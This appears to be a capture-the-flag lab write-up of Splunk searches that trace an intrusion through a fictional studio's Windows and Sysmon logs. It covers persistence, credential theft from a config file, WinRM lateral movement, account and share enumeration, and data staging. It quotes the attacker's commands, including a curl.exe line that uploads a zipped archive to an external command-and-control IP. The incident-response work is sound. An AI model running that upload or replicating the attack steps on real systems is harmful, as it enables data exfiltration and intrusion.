# Splunk Queries: Quiet as the Grave

This file contains the Splunk searches I used to investigate suspicious activity in the TryHatMe Studios environment. I've organized them around the main findings, showing how the evidence connects from the first PowerShell execution to the attempted data exfiltration.

All timestamps are in UTC.

## 1. Initial PowerShell Execution

I started with process creation events on `THM-SREYES`, focusing on the NeuralNexus review helper.

```spl
ComputerName="THM-SREYES" EventCode=1 "NeuralNexusReview"
| table _time ComputerName Image CommandLine ParentImage Message
| sort _time
```

**Finding:** At 12:29:48, `explorer.exe` launched PowerShell to run `review-helper.ps1` from the user's Downloads folder.

## 2. C2 Communication

The suspicious PowerShell activity was associated with an external IP address, `45.147.230.131`. I checked the network events to establish which process was responsible for the connections.

```spl
ComputerName="THM-SREYES" EventCode=3 DestinationIp="45.147.230.131"
| table _time ComputerName Image SourceIp DestinationIp DestinationPort ProcessGuid
| sort _time
| head 10
```

**Finding:** The PowerShell process connected to `45.147.230.131:8443` shortly after execution. The process GUID matched the malicious helper.

## 3. Persistence

Next, I checked whether the script had established a way to run again after the initial execution.

```spl
ComputerName="THM-SREYES" "NeuralNexusReview"
| search EventCode=13
| table _time ComputerName EventCode Image TargetObject Details Message
| sort _time
```

**Finding:** At 12:37:20, the script configured a Registry Run value named `NeuralNexusReview`, pointing to a PowerShell script under AppData.

I then checked process creation events for the same script.

```spl
ComputerName="THM-SREYES" EventCode=1 "review-helper.ps1"
| table _time ComputerName User Image CommandLine ParentImage ParentCommandLine Message
| sort _time
```

**Finding:** At 12:44:04, `explorer.exe` launched the AppData copy in a new logon session. The persistence mechanism was active.

## 4. Credential Access

PowerShell script-block logging provided another important lead: the deployment configuration file `deploy-settings.json`.

```spl
"deploy-settings.json"
| table _time ComputerName EventCode Message
| sort _time
```

**Finding:** At 13:01:41, a script block showed `Get-Content` and `ConvertFrom-Json` being used to load the configuration file. The script then constructed a `[PSCredential]` object from its username and password fields.

This was significant because the `svc-studioops` account appeared in the later remote authentication activity.

## 5. Movement to the IT Workstation

The authentication and process logs showed the `svc-studioops` account being used to access `THM-LSULLIVAN` through WinRM at 13:16:42.

On the destination workstation, `wsmprovhost.exe` launched:

```cmd
cmd.exe /c dir C:\ProgramData\StudioOps
```

The directory was worth investigating further because it contained IT support material.

```spl
"StudioOps" ("csv" OR "Get-Content" OR "Import-Csv" OR "Copy-Item")
| table _time ComputerName EventCode Message
| sort _time
```

**Finding:** At 13:36:43, a PowerShell script block recorded commands targeting `endpoint-list.csv` and `maintenance-runbook.txt` through a remote session.

## 6. Attempted Access to DC-01

The same service account was also involved in activity directed at the domain controller.

```spl
ComputerName="THM-LSULLIVAN" EventCode=4648 "DC-01"
| table _time ComputerName EventCode Message
| sort _time
```

**Finding:** At 13:48:25, `wsmprovhost.exe` supplied credentials to `HTTP/DC-01`. Windows logged a successful network authentication, although the available process events did not show remote command execution on DC-01.

## 7. Movement to the Marketing Workstation

The next confirmed remote execution activity involved `THM-MSMITH`. I searched for the Marketing release directory in process creation events.

```spl
ComputerName="THM-MSMITH" EventCode=1 "approved-release"
| table _time ComputerName Image CommandLine ParentImage Message
| sort _time
```

**Finding:** At 15:03:37, a WinRM session under `svc-studioops` executed:

```cmd
cmd.exe /c dir C:\StudioMarketing\approved-release
```

This put the attacker on the workstation containing the Marketing release materials.

## 8. Local Discovery

I also examined the administrative commands executed through the remote session on `THM-MSMITH`.

```spl
ComputerName="THM-MSMITH" EventCode=1 "Administrators"
| table _time ComputerName Image CommandLine ParentImage Message
| sort _time
```

**Finding:** At 16:03:38, `wsmprovhost.exe` spawned `net.exe localgroup Administrators`, followed by `net1.exe`. Other process events showed `net user` and `net share`.

Together, these commands point to local account, administrator group, and network share enumeration.

## 9. File Collection and Archiving

The focus then returned to `THM-SREYES`, where PowerShell activity involved staging files from the Marketing workstation and the NeuralNexus project directory.

```spl
ComputerName="THM-SREYES" EventCode=4104 "review-staging"
| table _time ComputerName EventCode Message
| sort _time
```

**Finding:** Two script blocks captured the collection sequence:

- **16:27:01:** Commands to create staging directories and copy Marketing release files and NeuralNexus project materials.
- **16:27:28:** `Compress-Archive` targeting the staged files and an archive named `review-cache.zip`.

The archive name was the link to the final part of the attack chain.

## 10. Attempted Exfiltration

I searched for `review-cache.zip` in process creation events to see what happened after the archive preparation.

```spl
ComputerName="THM-SREYES" EventCode=1 "review-cache.zip"
| table _time ComputerName User Image CommandLine ParentImage Message
| sort _time
```

**Finding:** At 16:27:54, `curl.exe` ran as a child of the persisted PowerShell process and attempted to upload the archive to the external C2 endpoint.

```cmd
curl.exe --fail --show-error --insecure --upload-file C:\Users\S460E~1.REY\AppData\Local\Temp\review-cache.zip https://45.147.230.131:8443/ingest/review-cache.zip
```

The process relationship connected the attempted upload directly to the malicious PowerShell helper identified earlier.

## Conclusion

The searches brought together several types of evidence: Sysmon process and network events, Windows authentication logs, Registry changes, and PowerShell script blocks.

The resulting timeline showed how the attacker moved from an initial PowerShell foothold to persistence, credential access, lateral movement, discovery, file staging, and attempted exfiltration.

The most useful part of the investigation was correlating events across different hosts and log sources. Individual commands provided clues, but their relationships established the attack chain.
